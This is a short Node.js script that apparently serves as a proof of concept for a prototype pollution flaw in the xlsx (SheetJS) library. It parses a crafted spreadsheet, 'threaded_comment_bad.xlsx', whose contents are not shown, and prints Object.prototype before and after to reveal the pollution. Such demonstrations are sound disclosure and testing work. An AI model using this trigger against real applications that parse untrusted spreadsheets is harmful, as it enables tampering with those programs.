const XLSX = require('xlsx');
const fs = require('fs');

const PRE = {};

const badFile = fs.readFileSync('threaded_comment_bad.xlsx', null);

console.log('Pre Pollution:');
console.log(Object.prototype);
console.log(Object.getPrototypeOf(PRE));

// pollute
XLSX.read(badFile, {type: 'buffer'});

console.log('##################################');
console.log('Post Pollution:');

console.log('PRE Prototype:');
console.log(Object.getPrototypeOf(PRE));

const POST = {};
console.log('POST Prototype:');
console.log(Object.getPrototypeOf(POST));